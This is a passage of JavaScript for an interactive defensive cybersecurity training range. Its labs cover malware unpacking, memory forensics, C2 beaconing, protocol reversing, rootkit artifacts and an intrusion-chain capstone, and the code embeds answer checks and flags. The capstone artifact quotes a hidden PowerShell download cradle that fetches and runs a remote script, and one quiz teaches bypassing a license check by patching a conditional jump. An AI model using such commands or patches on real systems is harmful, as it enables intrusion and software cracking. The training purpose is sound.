 if(/inject|remote thread|createremotethread|process inject/i.test(gv('dy_i')))setObj('dynamic','inject');else if(gv('dy_i'))toast('VirtualAllocEx+WriteProcessMemory+CreateRemoteThread = ?');
 if(/185\.220\.101\.47|cdn-telemetry/i.test(gv('dy_c')))setObj('dynamic','c2');else if(gv('dy_c'))toast('the connect()/DnsQuery target');
 if(/encrypt|ransom|cryptencrypt/i.test(gv('dy_x')))setObj('dynamic','impact');else if(gv('dy_x'))toast('CryptEncrypt over *.docx + .vault note = ?');
}
function labDynamic(){
 return `<p class="lede" style="margin-top:0">The sandbox ran it. Read the API trace and name each behaviour.</p>
 <div class="filterbar"><input id="dynfilter" autocomplete="off" placeholder="filter the trace:  Reg   ·   Process   ·   connect   ·   Crypt" value="${esc(LAB.dynFilter)}"></div>
 <div class="logview" id="dyn_body"></div>
 <div class="objbox" style="margin-top:16px"><h4>Submit findings</h4><div class="findform">
  <div><label>Persistence</label><input id="dy_p" placeholder="mechanism"></div>
  <div><label>Injection technique</label><input id="dy_i" placeholder="technique"></div>
  <div><label>C2 endpoint</label><input id="dy_c" placeholder="ip / domain"></div>
  <div><label>Impact / payload</label><input id="dy_x" placeholder="what it does"></div>
 </div><div style="margin-top:10px"><button class="btn" data-dyncheck="1">Check findings</button></div></div>
 <div class="hintbox"><b>Pattern recognition:</b> Run-key write = persistence; VirtualAllocEx→WriteProcessMemory→CreateRemoteThread into another PID = classic process injection; connect() to a hardcoded IP = C2; CryptEncrypt over user docs + a ransom note = impact (ransomware).</div>`;
}

/* ---- 7 · UNPACK ---- */
const STUB=[{a:'0x4051f0',t:'pushad',c:'save all registers'},{a:'0x4051f1',t:'mov esi, 0x40a000',c:'packed source'},{a:'0x4051f6',t:'mov edi, 0x401000',c:'dest = OEP region'},{a:'0x4051fb',t:'call VirtualAlloc',c:'alloc unpack buffer'},{a:'0x405200',t:'<decompress loop>',c:'rebuild original code'},{a:'0x405240',t:'popad',c:'restore registers'},{a:'0x405241',t:'jmp 0x401000',c:'TAIL JUMP → Original Entry Point',oep:true}];
function unpPaint(){const code=document.getElementById('unp_code');if(!code)return;code.innerHTML=STUB.map((s,i)=>'<div class="row" style="'+(i===LAB.unpPc?'background:rgba(45,226,230,.14)':'')+'"><span class="a">'+s.a+'</span><span class="mn" style="'+(s.oep?'color:var(--blood)':'')+'">'+esc(s.t)+'</span><span class="cm">  ; '+esc(s.c)+'</span></div>').join('');}
function unpStep(){if(LAB.unpPc<STUB.length-1)LAB.unpPc++;unpPaint();}
function unpRun(){LAB.unpPc=STUB.length-1;unpPaint();const o=document.getElementById('unp_out');if(o)o.innerHTML='<span class="hl">stopped on the tail jump → jmp 0x401000. That target is the OEP.</span>';}
function unpDump(){const o=document.getElementById('unp_out');if(!o)return;if(LAB.unpPc>=STUB.length-1){o.innerHTML='<span class="hl">[+] dumped process image at OEP 0x401000 → unpacked.exe. Now fix the entry point & rebuild imports.</span>';setObj('unpack','dump');}else o.innerHTML='<span class="err">[-] run to the tail jump first — dumping before OEP gives an incomplete payload.</span>';}
function unpCheck(){if(/0x?401000/.test(gv('unp_oep').toLowerCase().replace(/\s/g,'')))setObj('unpack','oep');else if(gv('unp_oep'))toast('the tail-jump target is the OEP');}
function labUnpack(){if(LAB.unpPc==null)LAB.unpPc=0;
 return `<p class="lede" style="margin-top:0">The packer stub decompresses the real code then jumps to it. Catch that jump.</p>
 <div class="repane"><h5>packer stub</h5><div class="asm" id="unp_code"></div></div>
 <div class="qchips" style="margin-top:12px"><button data-unpstep="1">Step ▸</button><button data-unprun="1">Run to tail jump ⏭</button><button data-unpdump="1">Dump at OEP ⤓</button></div>
 <div class="verdict" id="unp_out" style="margin-top:8px"></div>
 <div class="objbox" style="margin-top:14px"><h4>Submit & reason</h4><div class="findform"><div class="full"><label>OEP address</label><input id="unp_oep" placeholder="0x...."></div></div>
  <div style="margin-top:10px"><button class="btn" data-unpcheck="1">Check OEP</button></div>
  <p style="color:var(--ash);font-size:14px;margin:14px 0 8px">After dumping from memory, why must you rebuild the IAT?</p>
  <button class="opt" data-mcq="unpack|iat|1"><b>A</b>The dump has the loader's runtime-resolved addresses, not a static import table — it won't re-load without one</button>
  <button class="opt" data-mcq="unpack|iat|0"><b>B</b>To make the file smaller</button>
  <button class="opt" data-mcq="unpack|iat|0"><b>C</b>To strip debug symbols</button>
  <p style="color:var(--ash);font-size:14px;margin:14px 0 8px">A license check <code>jne fail</code> guards the unpacked code. To bypass it you…</p>
  <button class="opt" data-mcq="unpack|patch|1"><b>A</b>NOP the conditional jump (or flip jne→je) so it falls through</button>
  <button class="opt" data-mcq="unpack|patch|0"><b>B</b>Delete the .text section</button>
  <button class="opt" data-mcq="unpack|patch|0"><b>C</b>Increase the entropy</button>
 </div>
 <div class="hintbox"><b>Pipeline:</b> break at OEP (hardware bp on execute of the freshly-written region) → dump → fix entry point → rebuild imports (IAT) → fix section sizes → validate it loads.</div>`;
}

/* ---- 8 · MEMORY (EPROCESS/VAD/shellcode) ---- */
function mfBanner(){return ['<span class="dim">vol3 on a Win10 image. A process is hidden by DKOM (unlinked from the active list).</span>','<span class="dim">Diff pslist vs psscan, then inspect its VADs. Try: pslist · psscan · vadinfo &lt;pid&gt; · disasm &lt;addr&gt; · help</span>',''];}
function mfPaint(){const el=document.getElementById('mf_out');if(el){el.innerHTML=LAB.mfOut.join('\n');el.scrollTop=el.scrollHeight;}}
function mfRun(line){const out=LAB.mfOut;out.push('<span class="pmt">vol&gt;</span> '+esc(line));const c=line.trim(),P_=v=>out.push(v);
 if(c===''){}
 else if(c==='help')P_('pslist · psscan · vadinfo &lt;pid&gt; · disasm &lt;addr&gt; · clear');
 else if(c==='pslist'){['  PID   Name','  4     System','  812   explorer.exe','  1188  svchost.exe','  2440  chrome.exe'].forEach(P_);P_('<span class="dim">(active EPROCESS linked list)</span>');}
 else if(c==='psscan'){['  PID   Name','  4     System','  812   explorer.exe','  1188  svchost.exe','  2440  chrome.exe','  <span class="hl">3133  svchost.exe   ← in pool scan but NOT in pslist (unlinked / DKOM)</span>'].forEach(P_);}
 else if(/^vadinfo\s+3133$/.test(c)){P_('VAD for pid 3133:');P_('  0x009a0000 - 0x009a3fff  <span class="hl">PAGE_EXECUTE_READWRITE  Private</span>');P_('  <span class="dim">RWX private region in a "svchost" = injected code.</span>');setObj('memory','rwx');}
 else if(/^vadinfo\s+\d+$/.test(c)){P_('  (normal image-backed VADs, no RWX)');}
 else if(/^disasm\s+0x?9a0000$/.test(c.replace(/\s+/g,' '))){['  0x9a0000  fc            cld','  0x9a0001  e8 82 00 00 00  call 0x9a0088','  0x9a0006  60            pushad','  0x9a0007  31 d2         xor edx,edx','  <span class="hl">  → classic API-hashing shellcode prologue (Metasploit-style)</span>'].forEach(P_);setObj('memory','shellcode');}
 else if(c==='clear'){LAB.mfOut=mfBanner();mfPaint();return;}
 else P_('<span class="err">'+esc(c.split(/\s+/)[0])+': unknown (type help)</span>');
 out.push('');mfPaint();}
function mfCheck(){if(gv('mf_pid').trim()==='3133')setObj('memory','hidden');else if(gv('mf_pid'))toast('the PID present in psscan but missing from pslist');}
function labMemory(){if(!LAB.mfOut.length)LAB.mfOut=mfBanner();
 const chips=['pslist','psscan','vadinfo 3133','disasm 0x9a0000'];
 return `<div class="term"><div class="term__out" id="mf_out">${LAB.mfOut.join('\n')}</div><div class="term__in"><span>vol&gt;</span><div class="term-input-wrapper"><input id="mfcmd" autocomplete="off" spellcheck="false" placeholder="diff pslist vs psscan…"><span class="term-input-ghost" id="mfcmd-ghost"></span></div></div></div>
 <div class="qchips">${chips.map(x=>'<button data-mfq="'+esc(x)+'">'+esc(x)+'</button>').join('')}</div>
 <div class="objbox" style="margin-top:16px"><h4>Submit findings</h4><div class="findform"><div class="full"><label>Hidden process PID</label><input id="mf_pid" placeholder="the unlinked one"></div></div><div style="margin-top:10px"><button class="btn" data-mfcheck="1">Check</button></div></div>
 <div class="hintbox"><b>DKOM detection:</b> rootkits unlink the malicious EPROCESS from the doubly-linked active list, so <code>pslist</code> can't see it — but <code>psscan</code> finds the block by scanning pool tags. The diff is the giveaway; then RWX VADs reveal where the code lives.</div>`;
}

/* ---- 9 · NETWORK ---- */
const FLOWS=[['10.0.2.15','142.250.72.196:443','TLS','browsing',''],
 ['10.0.2.15','185.220.101.47:443','TLS','beacon','t=0,61,119,182,240 (Δ≈60s, low jitter)'],
 ['10.0.2.15','93.184.216.34:80','HTTP','GET /update.bin','response starts 4D 5A (MZ)'],
 ['10.0.2.15','10.0.2.3:53','DNS','queries','normal']];
function netBeacon(){const o=document.getElementById('net_out');if(o)o.innerHTML='Inter-arrival analysis per destination:\n  142.250.72.196  irregular (human browsing)\n  <span class="hl">185.220.101.47  Δ = 61,58,63,58 s  → periodic beacon (~60s), &lt;10% jitter → C2</span>';}
function netJa3(){const o=document.getElementById('net_out');if(o)o.innerHTML='JA3 of TLS client → 185.220.101.47:\n  a0e9f5d64349fb13191bc781f81f42e1\n  <span class="hl">match: known Cobalt-Strike default profile.</span>';LAB.netJa3=true;setObj('network','ja3');}
function netCarve(){const o=document.getElementById('net_out');if(o)o.innerHTML='Reassembling HTTP body of GET /update.bin:\n  4D 5A 90 00 03 00 ...  <span class="hl">→ "MZ" → a Windows PE executable was downloaded.</span>';setObj('network','file');}
function netCheck(){
 if(/185\.220\.101\.47/.test(gv('n_host')))setObj('network','beacon');else if(gv('n_host'))toast('which dst has periodic timing?');
 if(/^\s*60\s*s?\s*$/i.test(gv('n_int'))||gv('n_int').trim()==='60')setObj('network','interval');else if(gv('n_int'))toast('average the deltas (~?)');
}
function labNetwork(){
 return `<p class="lede" style="margin-top:0">Four flows. One is a C2 — find it by its rhythm, not its content.</p>
 <div class="repane"><h5>flow table</h5><table class="kv"><tr><th>src</th><th>dst</th><th>proto</th><th>info</th><th>timing/notes</th></tr>
 ${FLOWS.map(f=>'<tr><td>'+f[0]+'</td><td>'+f[1]+'</td><td>'+f[2]+'</td><td>'+esc(f[3])+'</td><td class="'+(f[4].indexOf('beacon')>-1||f[4].indexOf('MZ')>-1?'tag-bad':'')+'">'+esc(f[4])+'</td></tr>').join('')}</table></div>
 <div class="qchips" style="margin-top:12px"><button data-netact="beacon">analyze beaconing</button><button data-netact="ja3">lookup JA3</button><button data-netact="carve">carve transferred file</button></div>
 <div class="pktdetail" id="net_out" style="margin-top:12px">run an analysis…</div>
 <div class="objbox" style="margin-top:16px"><h4>Submit findings</h4><div class="findform">
  <div><label>Beaconing C2 host</label><input id="n_host" placeholder="ip"></div>
  <div><label>Beacon interval (s)</label><input id="n_int" placeholder="seconds"></div>
 </div><div style="margin-top:10px"><button class="btn" data-netcheck="1">Check</button></div></div>
 <div class="hintbox"><b>Beaconing:</b> malware that phones home on a timer shows near-constant inter-arrival gaps (low jitter) — invisible to payload inspection but obvious in timing. JA3 fingerprints the TLS client; carving reassembles transferred files (here an MZ/PE).</div>`;
}

/* ---- 10 · PROTOCOL ---- */
function protoBuild(){if(LAB.protoFrames)return;const key=0x5a;const msgs=[[0x01,'ID=BV01'],[0x02,'whoami'],[0x03,'BV{pr0t0_r3}']];const bytes=[];msgs.forEach(m=>{const pl=m[1].split('').map(c=>c.charCodeAt(0)^key);bytes.push(0xBE,0xEF,pl.length&0xff,(pl.length>>8)&0xff,m[0]);pl.forEach(b=>bytes.push(b));});LAB.protoBytes=bytes;LAB.protoFrames=msgs.length;LAB.protoKeyVal=key;}
function protoHex(){protoBuild();return LAB.protoBytes.map((b,i)=>b.toString(16).padStart(2,'0')).join(' ');}
function protoParse(){protoBuild();const o=document.getElementById('pr_out');if(!o)return;const b=LAB.protoBytes;let s='',i=0,n=0;while(i<b.length){if(b[i]===0xBE&&b[i+1]===0xEF){const len=b[i+2]|(b[i+3]<<8),op=b[i+4];s+='frame '+(++n)+': magic BE EF  len='+len+'  opcode=0x0'+op+'  payload['+len+']\n';i+=5+len;}else i++;}o.textContent=s+'\n→ framing = [BE EF][len:2 LE][opcode:1][payload:len]';}
function protoDecode(){protoBuild();const o=document.getElementById('pr_out');if(!o)return;const k=parseInt(gv('pr_key').replace(/0x/i,''),16);if(isNaN(k)){o.textContent='enter a hex XOR key first (try 5a).';return;}const b=LAB.protoBytes;let s='',i=0;const names={1:'BEACON',2:'EXEC',3:'EXFIL'};while(i<b.length){if(b[i]===0xBE&&b[i+1]===0xEF){const len=b[i+2]|(b[i+3]<<8),op=b[i+4];let pl='';for(let j=0;j<len;j++)pl+=String.fromCharCode(b[i+5+j]^k);s+='['+(names[op]||('op'+op))+'] '+pl+'\n';i+=5+len;}else i++;}o.innerHTML='decoded with key 0x'+k.toString(16)+':\n<span class="hl">'+esc(s)+'</span>';if(k===LAB.protoKeyVal){setObj('protocol','key');if(/whoami|BV\{/.test(s))setObj('protocol','cmd');}}
function protoCheck(){if(/be\s*ef/i.test(gv('pr_magic').replace(/0x/ig,'')))setObj('protocol','magic');else if(gv('pr_magic'))toast('the 2 bytes that start every frame');
 if(gv('pr_frames').trim()===String(LAB.protoFrames))setObj('protocol','frames');else if(gv('pr_frames'))toast('count the BE EF markers');}
function labProtocol(){protoBuild();
 return `<p class="lede" style="margin-top:0">A raw capture of a custom C2 protocol. No RFC — reverse the structure from the bytes.</p>
 <div class="pktdetail" style="margin-top:0">${protoHex()}</div>
 <div class="qchips" style="margin-top:12px"><button data-protoact="parse">auto-frame</button><button data-protoact="decode">decode payloads (XOR)</button> <input id="pr_key" class="lab-sel" style="width:80px" placeholder="key hex 5a"></div>
 <div class="pktdetail" id="pr_out" style="margin-top:12px">find the magic, the framing, then the key…</div>
 <div class="objbox" style="margin-top:16px"><h4>Submit findings</h4><div class="findform">
  <div><label>Frame magic (hex)</label><input id="pr_magic" placeholder="2 bytes"></div>
  <div><label># of frames</label><input id="pr_frames" placeholder="count"></div>
 </div><div style="margin-top:10px"><button class="btn" data-protocheck="1">Check</button></div></div>
 <div class="hintbox"><b>Reverse the grammar:</b> look for a repeating magic to find frame boundaries, a length field (here 2 bytes LE) to bound each message, an opcode (the command vocabulary), then break the payload obfuscation — XOR 0x5A here. Hooking the encrypt function with Frida would hand you the key directly.</div>`;
}

/* ---- 11 · ROOTKIT ---- */
function labRootkit(){const tab=LAB.rkTab;const tabs=[['reg','registry'],['mft','MFT'],['evt','event log'],['hook','SSDT']];let body='';
 if(tab==='reg')body='<div class="pcode">HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\<span class="st">Run</span>\n   <span class="hl">WindowsUpdate = C:\\Temp\\svc.exe</span>   <span class="cm">// not a real Windows entry</span></div>';
 else if(tab==='mft')body='<div class="pcode">svc.exe  (MFT record 41233)\n   $STANDARD_INFORMATION  Created: <span class="hl">2026-06-01 08:00</span>\n   $FILE_NAME            Created: <span class="hl">2019-03-12 11:04</span>\n   <span class="cm">// $SI newer than $FN, round timestamp → timestomping (SetFileTime)</span></div>';
 else if(tab==='evt')body='<div class="pcode">System.evtx — Event ID <span class="hl">7045</span> (A service was installed)\n   Service Name : <span class="hl">WinSvc</span>\n   Image Path   : C:\\Temp\\svc.exe\n   Start Type   : auto</div>';
 else body='<div class="pcode">SSDT entry NtQueryDirectoryFile →\n   <span class="hl">0xFFFFF80012AB1000  (outside ntoskrnl.exe range)</span>\n   <span class="cm">// pointer redirected to rootkit code → hides files/processes from directory listings</span></div>';
 return `<div class="logtabs">${tabs.map(t=>'<button data-rktab="'+t[0]+'" aria-current="'+(tab===t[0])+'">'+t[1]+'</button>').join('')}</div>
 ${body}
 <div class="objbox" style="margin-top:16px"><h4>Submit findings</h4><div class="findform">
  <div><label>Persistence (key value / path)</label><input id="rk_p" placeholder="autostart"></div>
  <div><label>Timestomped? (yes/no)</label><input id="rk_t" placeholder="yes/no"></div>
  <div><label>Malicious service name</label><input id="rk_s" placeholder="from 7045"></div>
  <div><label>Hooked API</label><input id="rk_h" placeholder="SSDT function"></div>
 </div><div style="margin-top:10px"><button class="btn" data-rkcheck="1">Check findings</button></div></div>
 <div class="hintbox"><b>Artifacts beat the rootkit:</b> a process hidden in live memory still leaves a Run key, an MFT record (with tell-tale $SI/$FN time mismatch), a 7045 service-install event, and — if it hooks the SSDT — a kernel pointer aimed outside ntoskrnl. Cross-view: the rootkit can't lie in every place at once.</div>`;
}
function rkCheck(){
 if(/run|svc\.exe|windowsupdate/i.test(gv('rk_p')))setObj('rootkit','persist');else if(gv('rk_p'))toast('the autostart Run value');
 if(/^y/i.test(gv('rk_t')))setObj('rootkit','timestomp');else if(gv('rk_t'))toast('compare $SI vs $FN created times');
 if(/winsvc/i.test(gv('rk_s')))setObj('rootkit','service');else if(gv('rk_s'))toast('the 7045 Service Name');
 if(/ntquerydirectoryfile/i.test(gv('rk_h')))setObj('rootkit','hook');else if(gv('rk_h'))toast('the redirected SSDT entry');
}

/* ---- 12 · CAPSTONE ---- */
const CAP=[
 {obj:'access',title:'Stage 1 · Initial access',art:'EMAIL\n  From: billing@inv0ice-corp.com\n  Attachment: invoice_2026.xlsm  (macro-enabled spreadsheet)',q:'Attachment file type that delivered it?',test:v=>/xlsm|macro|excel|spreadsheet/i.test(v),fb:'Macro-enabled Office doc → user-enabled macros = initial access.'},
 {obj:'exec',title:'Stage 2 · Execution',art:'PROCESS\n  excel.exe → cmd.exe → powershell.exe -nop -w hidden -enc SUVYIChOZXct...\n  (decodes to: IEX (New-Object Net.WebClient).DownloadString(\'http://185.220.101.47/x.ps1\'))',q:'What executed the payload? (interpreter)',test:v=>/powershell|iex|pwsh/i.test(v),fb:'Macro spawned PowerShell with a download cradle — living off the land.'},
 {obj:'c2',title:'Stage 3 · Command & control',art:'PCAP\n  10.0.2.15 → 185.220.101.47:443 every ~60s, low jitter (beacon)',q:'C2 IP address?',test:v=>/185\.220\.101\.47/.test(v),fb:'Periodic beacon to a hardcoded IP = C2 channel.'},
 {obj:'impact',title:'Stage 4 · Impact',art:'HOST\n  CryptEncrypt over *.docx/*.xlsx, files renamed *.vault, READ_ME.vault.txt dropped',q:'Attacker objective / impact?',test:v=>/ransom|encrypt|impact/i.test(v),fb:'Mass encryption + ransom note = ransomware. Chain reconstructed.'},
];
function capSubmit(){const i=LAB.capStage,st=CAP[i];if(!st)return;const v=gv('cap_in');const out=document.getElementById('cap_fb');
 if(st.test(v)){setObj('capstone',st.obj);if(out)out.innerHTML='<span class="hl">[+] '+esc(st.fb)+'</span>';LAB.capStage++;setTimeout(()=>render(),400);}
 else{if(out)out.innerHTML='<span class="err">[-] not quite — re-read the artifact.</span>';}}
function labCapstone(){const i=LAB.capStage;
 if(i>=CAP.length)return `<div class="objbox"><h4>Case closed</h4><p style="color:var(--ash)">You reconstructed the full chain: <b style="color:var(--bone)">phishing → PowerShell execution → C2 beacon (185.220.101.47) → ransomware</b>. Every Map phase shows up in one real intrusion.</p><div class="pktdetail" style="margin-top:10px"><span class="hl">BV{capst0ne_cl0s3d}</span></div><button class="btn" data-capreset="1" style="margin-top:10px">Run it again ↺</button></div>`;
 const st=CAP[i];
 return `<p class="lede" style="margin-top:0">Stage ${i+1} of ${CAP.length}. Make the call at each step; a correct answer unlocks the next stage.</p>
 <div class="casebar"><span>STAGE: <b>${i+1}/${CAP.length}</b></span><span><a data-capreset="1" style="cursor:pointer;color:var(--volt)">↺ Restart</a></span></div>
 <div class="repane"><h5>${esc(st.title)}</h5><div class="pktdetail" style="border:0">${esc(st.art)}</div></div>
 <div class="findform" style="margin-top:12px"><div class="full"><label>${esc(st.q)}</label><input id="cap_in" placeholder="your answer"></div></div>
 <div style="margin-top:10px"><button class="btn" data-capsubmit="1">Submit ▸</button></div>
 <div class="verdict" id="cap_fb" style="margin-top:10px"></div>
 <div class="hintbox"><b>Capstone:</b> this is the whole track fused — disk/format/asm skills read the artifacts, static/dynamic/memory/network skills produce the findings, and you narrate the kill chain end to end.</div>`;
}

/* ---- grouped Range hub + init hooks + events ---- */
function viewRange(){
 if(state.lab)return viewLab(state.lab);
 const card=l=>{const d=labDoneCount(l.id),t=labTotal(l.id),pc=Math.round(d/t*100);return '<div class="labcard" data-lab="'+l.id+'" data-done="'+(d===t?1:0)+'">'+(l.phase?'<span class="prog" style="float:right">CH '+l.phase+'</span>':'')+'<span class="chip t-'+l.track+'">'+l.track+'</span> <span class="prog">· '+esc(l.tool)+'</span><h3>'+esc(l.name)+'</h3><p>'+esc(l.blurb)+'</p><div class="prog">'+d+'/'+t+' objectives '+(d===t?'· ✓ CLEARED':'')+'</div><div class="pbar"><i style="width:'+pc+'%"></i></div></div>';};
 const chap=LABS.filter(l=>l.group==='chapter').sort((a,b)=>a.phase-b.phase),skill=LABS.filter(l=>!l.group);
 return `
 <div class="modehead"><div class="eyebrow" style="color:var(--volt)">Hands-on · cyber range</div><h1 class="h1" style="font-size:clamp(24px,4vw,34px)">The Range</h1>
 <p class="lede">Artifacts and tools, not definitions. <b style="color:var(--bone)">Chapter labs</b> map 1:1 to the 12 phases on the Map (open them from a phase card too); <b style="color:var(--bone)">Skill labs</b> are cross-cutting drills. Progress saves locally.</p></div>
 <div class="sec__h">Chapter labs — one per Map phase (1–12)</div>
 <div class="labgrid">${chap.map(card).join('')}</div>
 <div class="sec__h" style="margin-top:28px">Skill labs — cross-cutting</div>
 <div class="labgrid">${skill.map(card).join('')}</div>`;
}
Object.assign(LABINIT,{
 memory: ()=>{ if(!LAB.mfOut.length)LAB.mfOut=mfBanner(); mfPaint(); const e=document.getElementById('mfcmd'); if(e)e.focus(); },
 asm: ()=>{ if(!LAB.asmReg)asmReset(); asmPaint(); },
 unpack: ()=>unpPaint(),
 dynamic: ()=>dynPaint(),
});
document.addEventListener('click',e=>{
 const t=e.target,c=s=>t.closest(s);let el;
 if(el=c('[data-phaselab]')){state.mode='range';state.lab=el.dataset.phaselab;render();return;}
 if(el=c('[data-mcq]')){const a=el.dataset.mcq.split('|');if(a[2]==='1'){setObj(a[0],a[1]);el.dataset.state='correct';}else{el.dataset.state='wrong';toast('not quite — re-read it');}return;}
 if(el=c('[data-diskact]')){el.dataset.diskact==='parse'?diskParse():diskCarve();return;}
 if(el=c('[data-diskcheck]')){diskCheck();return;}
 if(el=c('[data-asmstep]')){asmStep();return;}
 if(el=c('[data-asmrun]')){asmRunAll();return;}
 if(el=c('[data-asmreset]')){asmReset();asmPaint();return;}
 if(el=c('[data-asmcheck]')){asmCheck();return;}
 if(el=c('[data-bintab]')){LAB.binTab=el.dataset.bintab;render();return;}
 if(el=c('[data-bincheck]')){binCheck();return;}
 if(el=c('[data-statact]')){staticAct(el.dataset.statact);return;}
 if(el=c('[data-statyara]')){staticYara();return;}
 if(el=c('[data-statcheck]')){staticCheck();return;}
 if(el=c('[data-dyncheck]')){dynCheck();return;}
 if(el=c('[data-unpstep]')){unpStep();return;}
 if(el=c('[data-unprun]')){unpRun();return;}
 if(el=c('[data-unpdump]')){unpDump();return;}
 if(el=c('[data-unpcheck]')){unpCheck();return;}
 if(el=c('[data-mfq]')){mfRun(el.dataset.mfq);const i=document.getElementById('mfcmd');if(i){i.value='';updateGhostText(i);i.focus();}return;}
 if(el=c('[data-mfcheck]')){mfCheck();return;}
 if(el=c('[data-netact]')){({beacon:netBeacon,ja3:netJa3,carve:netCarve}[el.dataset.netact]||function(){})();return;}
 if(el=c('[data-netcheck]')){netCheck();return;}
 if(el=c('[data-protoact]')){el.dataset.protoact==='parse'?protoParse():protoDecode();return;}
 if(el=c('[data-protocheck]')){protoCheck();return;}
 if(el=c('[data-rktab]')){LAB.rkTab=el.dataset.rktab;render();return;}
 if(el=c('[data-rkcheck]')){rkCheck();return;}
 if(el=c('[data-capsubmit]')){capSubmit();return;}
 if(el=c('[data-capreset]')){LAB.capStage=0;render();return;}
});
document.addEventListener('keydown',e=>{ if(e.key!=='Enter')return; if(e.target.id==='mfcmd'){const v=e.target.value;e.target.value='';mfRun(v);e.target.focus();e.preventDefault();} });
document.addEventListener('input',e=>{ if(e.target.id==='dynfilter'){LAB.dynFilter=e.target.value;dynPaint();} });

export const LAB_RENDERERS = {
  mem:labMem, re:labRE, pcap:labPcap, log:labLog, crypto:labCrypto, web:labWeb,
  pe:labPE, stego:labStego, pwn:labPwn, privesc:labPrivesc, hash:labHash,
  email:labEmail, intel:labIntel, disk:labDisk, asm:labAsm, binfmt:labBinfmt,
  static:labStatic, ghidra:labGhidra, dynamic:labDynamic, unpack:labUnpack,
  memory:labMemory, network:labNetwork, protocol:labProtocol, rootkit:labRootkit,
  capstone:labCapstone
};

export function memRunCommand(line) { memRun(line); }
